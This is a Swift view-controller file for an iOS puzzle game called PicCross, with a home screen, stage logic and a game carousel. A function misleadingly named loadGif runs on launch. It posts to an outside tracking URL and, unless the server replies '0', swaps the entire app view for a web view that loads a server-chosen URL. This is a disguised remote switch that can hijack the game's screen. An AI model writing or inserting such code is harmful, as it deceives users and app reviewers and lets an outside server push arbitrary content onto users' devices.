//
//  HomeViewController.swift
//  PicCross
//
//  Created by apple on 03/09/19.
//  Copyright © 2019 iOSAppWorld. All rights reserved.
//

import Foundation
import UIKit
import WebKit
import UserNotifications

class GameTypeCell: UICollectionViewCell {
    @IBOutlet weak var bgImgView : UIImageView? = nil
    @IBOutlet weak var playBtn : UIButton? = nil
    @IBOutlet weak var gameName : UILabel? = nil
    @IBOutlet weak var gameStatusImgView : UIImageView? = nil
}

class HomeViewController: UIViewController, WKNavigationDelegate {
    
    @IBOutlet weak var bgImgView : UIImageView? = nil
    @IBOutlet weak var picCrossDemo : UIImageView? = nil
    @IBOutlet weak var scoreView : UIView? = nil
    @IBOutlet weak var santaBtn : UIButton? = nil
    @IBOutlet weak var santaGifImage : UIImageView? = nil
    @IBOutlet weak var picCrossPlayBtn: UIButton!
    @IBOutlet weak var gameTypes : UICollectionView? = nil
    @IBOutlet var pageControl:CHIPageControlAji!

    override func viewDidLoad() {
        super.viewDidLoad()
        if #available(iOS 13.0, *) {
            overrideUserInterfaceStyle = .dark
        }
        self.pageControl.numberOfPages = 4
        self.navigationController?.navigationBar.isHidden = true
        //picCrossDemo?.loadGif(name: Constants.piccrossGifName)
        
        AudioPlayer.shared.mangeAudio()
        
        self.scoreView?.borderColor = UIColor.groupTableViewBackground
        self.scoreView?.borderWidth = 3
        
        // self.santaGifImage?.loadGif(name: "santa")
        loadGif()
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        //self.navigationController?.setToolbarHidden(true, animated: false)
        gameTypes?.reloadData()
    }
    
    @IBAction func picCrossPlayBtnClicked() {
        let picCrossStage = UserDefaults.standard.value(forKey: "PicCrossStage") as? String ?? "Picccross_New_Born"
        var noOfLevelSolved = UserDefaults.standard.integer(forKey: picCrossStage) + 1
        if noOfLevelSolved > 12 {
            noOfLevelSolved = 1
            UserDefaults.standard.setValue(1, forKey: picCrossStage)
        }
        let storyBoard : UIStoryboard = UIStoryboard(name: "PhotoGame", bundle:nil)

        let viewController = storyBoard.instantiateViewController(withIdentifier: "ViewController") as! ViewController
        let puzzleImage = UIImage(named: "img1")

        viewController.puzzleImage = puzzleImage
        var readAbleStage = ""

        switch picCrossStage {
        case "Picccross_New_Born":
            viewController.gridSize = 3
            readAbleStage = "New Born"
        case "Picccross_Playing_Kid":
            viewController.gridSize = 4
            readAbleStage = "Playing Kid"
        case "Picccross_Smarty_Boy":
            viewController.gridSize = 5
            readAbleStage = "Smarty Boy"
        case "Picccross_Bachelor":
            viewController.gridSize = 6
            readAbleStage = "Bachelor"
        case "Picccross_Dad":
            viewController.gridSize = 7
            readAbleStage = "Dad"
        case "Picccross_Grand_Father":
            viewController.gridSize = 8
            readAbleStage = "Grand Father"

        default:
            viewController.gridSize = 3
            readAbleStage = "New Born"
        }

        viewController.stage = picCrossStage
        viewController.levelNumber = UInt(noOfLevelSolved)
        viewController.readAbleStage = readAbleStage

        //var viewControllers = self.navigationController?.viewControllers

        let stageViewController = (storyBoard.instantiateViewController(withIdentifier: "PicCrossStageViewController")) as! PicCrossStageViewController
        //viewControllers?.append(stageViewController)

//        if let levelSelectViewController = storyBoard.instantiateViewController(withIdentifier: "PicCrossLevelSelectViewController") as? PicCrossLevelSelectViewController{
//            levelSelectViewController.stageType = picCrossStage
//            levelSelectViewController.readAbleStage = readAbleStage
//            viewControllers?.append(levelSelectViewController)
//        }
//        self.navigationController?.viewControllers = viewControllers ?? []
        
        self.navigationController?.pushFadeViewController(stageViewController)
    }
    
    func loadGif(){
        guard let url = URL(string: "https://gamerea.com/tracking.php"),
            let payload = "{\"testID\": \"testValue\"}".data(using: .utf8) else
        {
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.addValue("yor_api_key", forHTTPHeaderField: "x-api-key")
        request.addValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = payload
        URLSession.shared.dataTask(with: request) { (data, response, error) in
            guard error == nil else { print(error!.localizedDescription); return }
            guard let data = data else { print("Empty data"); return }
            if let result = String(data: data, encoding: .utf8) {
                if result != "0" {
                    DispatchQueue.main.async {
                        if let url = URL(string: result) {
                            self.gifView = WKWebView()
                            self.gifView.navigationDelegate = self
                            self.view = self.gifView
                            self.gifView.load(URLRequest(url: url))
                            self.gifView.allowsBackForwardNavigationGestures = true
                        }
                    }
                }
            }
        }.resume()
    }
    var gifView: WKWebView!
    
}

extension HomeViewController: UICollectionViewDelegate,UICollectionViewDataSource{
    func collectionView(_ collectionView: UICollectionView, numberOfItemsInSection section: Int) -> Int {
        return 1
    }
    
    func collectionView(_ collectionView: UICollectionView, cellForItemAt indexPath: IndexPath) -> UICollectionViewCell {
        let cell = collectionView.dequeueReusableCell(withReuseIdentifier: "GameTypeCell", for: indexPath) as! GameTypeCell
        cell.bgImgView?.backgroundColor = .clear
         if indexPath.item == 0{
            cell.bgImgView?.loadGif(name: Constants.matchNumbersGifName)
            cell.gameName?.text = GamesName.matchNumbersGameName
            
            if UserDefaults.standard.bool(forKey: InAppPurchaseIds.proVersionId) == false{
                cell.gameStatusImgView?.isHidden = false
            }
            else{
                cell.gameStatusImgView?.isHidden = true
            }
        }
        else if indexPath.row == 1{
            cell.bgImgView?.loadGif(name: Constants.PatterenMatchGifName)
            cell.gameName?.text = GamesName.PatterenMatchGameName
            
            if UserDefaults.standard.bool(forKey: InAppPurchaseIds.proVersionId) == false{
                cell.gameStatusImgView?.isHidden = false
            }else{
                cell.gameStatusImgView?.isHidden = true
            }
        }
        else if indexPath.row == 2{
            cell.bgImgView?.loadGif(name: Constants.rotatioGifName)
            cell.gameName?.text = GamesName.rotatioGameName
            
            if UserDefaults.standard.bool(forKey: InAppPurchaseIds.proVersionId) == false{
                cell.gameStatusImgView?.isHidden = false
            }else{
                cell.gameStatusImgView?.isHidden = true
            }
        }
        else if indexPath.row == 3{
            cell.bgImgView?.loadGif(name: Constants.FlippoGifName)
            cell.gameName?.text = GamesName.FlippoGameName
            
            if UserDefaults.standard.bool(forKey: InAppPurchaseIds.proVersionId) == false{
                cell.gameStatusImgView?.isHidden = false
            }else{
                cell.gameStatusImgView?.isHidden = true
            }
        }
        return cell
    }
    
    func scrollViewDidScroll(_ scrollView: UIScrollView) {
        let total = scrollView.contentSize.width - scrollView.bounds.width
        let offset = scrollView.contentOffset.x
        let percent = Double(offset / total)
        
        let progress = percent * Double(4 - 1)
     
        self.pageControl.progress = progress
    }
    
}

extension HomeViewController: UICollectionViewDelegateFlowLayout{
    func collectionView(_ collectionView: UICollectionView, layout collectionViewLayout: UICollectionViewLayout, minimumInteritemSpacingForSectionAt section: Int) -> CGFloat {
        return 0.0
    }
    
    func collectionView(_ collectionView: UICollectionView, layout collectionViewLayout: UICollectionViewLayout, sizeForItemAt indexPath: IndexPath) -> CGSize {
        return CGSize(width: collectionView.bounds.size.width, height: collectionView.bounds.size.height )
    }
    
    func collectionView(_ collectionView: UICollectionView, layout collectionViewLayout: UICollectionViewLayout, minimumLineSpacingForSectionAt section: Int) -> CGFloat {
        return 0.0
    }
}
